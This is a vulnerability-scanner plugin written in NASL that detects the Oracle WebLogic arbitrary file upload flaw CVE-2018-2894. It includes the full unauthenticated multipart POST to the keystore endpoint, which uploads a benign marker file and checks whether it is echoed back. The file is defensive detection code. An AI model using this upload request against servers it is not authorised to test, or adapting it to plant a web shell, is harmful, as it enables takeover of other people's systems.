include("compat.inc");

if(description){
	script_id(51799007);
	script_version ("$Revision: 0.1 $");
	script_cvs_date("$Date: 2018/04/18 13:37:00 $");

	script_cve_id("CVE-2018-2894");
	script_bugtraq_id(104763);
	# script_osvdb_id(40943);
	# script_xref(name:"RHSA", value:"2008:0031");

	script_name(english: "WebLogic Upload(CVE-2018-2894)");
	script_summary(english: "Upload file to the server.");

	script_set_attribute(attribute:"synopsis", value:
"The remote Oracle WebLogic server is affected by upload any file to the server.");
	script_set_attribute(attribute:"description", value:
"Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: WLS - Web Services). Supported versions that are affected are 10.3.6.0, 12.1.3.0, 12.2.1.2 and 12.2.1.3. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server.");
	script_set_attribute(attribute:"see_also", value:"http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html");
	script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/bid/104763");
	script_set_attribute(attribute:"see_also", value:"http://www.securitytracker.com/id/1041301");
	script_set_attribute(attribute:"solution", value:
	"Upgrade to the relevant fixed version referenced in the vendor
advisory.");

	script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
	script_set_attribute(attribute:"exploit_available", value:"true");
	# script_set_attribute(attribute:"exploit_framework_core", value:"true");
	# script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
	# script_set_attribute(attribute:"canvas_package", value:'CANVAS');

	script_set_attribute(attribute:"vuln_publication_date", value:"2018/07/24");
	script_set_attribute(attribute:"patch_publication_date", value:"2018/07/24");
	script_set_attribute(attribute:"plugin_publication_date", value:"2018/07/24");
	script_set_attribute(attribute:"plugin_modification_date", value:"2018/07/24");

	script_set_attribute(attribute:"plugin_type", value:"remote");
	script_set_attribute(attribute:"cpe", value:"cpe:/a:oracle:weblogic_server");
	# script_set_attribute(attribute:"in_the_news", value:"true");
	# script_set_attribute(attribute:"stig_severity", value:"C");

	script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
	script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
	script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
	script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:X");
	script_set_attribute(attribute:"risk_factor", value: "High" );

	script_end_attributes();

	script_category(ACT_ATTACK);
	script_family(english:"Web Servers");

	script_copyright(english:"This script is Copyright (C) dec0y");

	script_dependencies("weblogic_detect.nasl","t3_detect.nasl");
	script_require_ports("Services/t3", 7001);

	exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("audit.inc");

appname = "Oracle WebLogic Server";

port = get_service(svc:'t3', default:7001, exit_on_fail:TRUE);
# get_kb_item_or_exit("www/weblogic");
# port = -1;
# if(isnull(get_kb_item("www/weblogic/7001/installed")))
# {
# 	ports = get_kb_list("Services/www");
# 	if(isnull(ports)) audit(AUDIT_INST_VER_NOT_VULN, appname);
# 	foreach p (ports)
# 	{
# 		if(!isnull(get_kb_item("www/weblogic/" + p + "/installed")))
# 		{
# 			port = p;
# 			break;
# 		}
# 	}
# }
# else
# {
# 	port = 7001;
# }
# display(port);
# if(port == -1) audit(AUDIT_INST_VER_NOT_VULN, appname);

host = get_host_name();

t = unixtime();
url = "/ws_utc/resources/setting/keystore?timestamp=" + t;
pat = hexstr(rand_str(length:10));
data = '-----------------------------5160556491658135098666069798\r\n';
data = data + 'Content-Disposition: form-data; name="ks_name"\r\n';
data = data + '\r\n';
data = data + 'n\r\n';
data = data + '-----------------------------5160556491658135098666069798\r\n';
data = data + 'Content-Disposition: form-data; name="ks_edit_mode"\r\n';
data = data + '\r\n';
data = data + 'false\r\n';
data = data + '-----------------------------5160556491658135098666069798\r\n';
data = data + 'Content-Disposition: form-data; name="ks_password_front"\r\n';
data = data + '\r\n';
data = data + 'p\r\n';
data = data + '-----------------------------5160556491658135098666069798\r\n';
data = data + 'Content-Disposition: form-data; name="ks_password"\r\n';
data = data + '\r\n';
data = data + 'p\r\n';
data = data + '-----------------------------5160556491658135098666069798\r\n';
data = data + 'Content-Disposition: form-data; name="ks_password_changed"\r\n';
data = data + '\r\n';
data = data + 'true\r\n';
data = data + '-----------------------------5160556491658135098666069798\r\n';
data = data + 'Content-Disposition: form-data; name="ks_filename"; filename="';
data = data + pat;
data = data + '"\r\n';
data = data + 'Content-Type: text/x-log\r\n';
data = data + '\r\n';
data = data + '20180712 15:58:11 Hangup (0:00:00)\r\n';
data = data + '20180712 19:56:36 Hangup (0:00:00)\r\n';
data = data + '\r\n';
data = data + '-----------------------------5160556491658135098666069798--';

headers = make_array("Content-Type", "multipart/form-data; boundary=---------------------------5160556491658135098666069798");

res = http_send_recv3(
    host: host,
    port: port,
    method: "POST",
    item:   url,
    data: data,
    add_headers: headers,
    exit_on_fail: TRUE
);


# if(!ereg(pattern:"\$Proxy[0-9]+", string:data, multiline:true, icase:false)){
if("HTTP/1.1 200 OK" >!< res[0] || '<keyStore>'+pat+'</keyStore>' >!< res[2]) {
	audit(AUDIT_INST_VER_NOT_VULN, appname);
} else {
	security_report_v4(port:port, severity:SECURITY_HOLE, extra:"Found WebLogic Upload CVE-2018-2894");
}
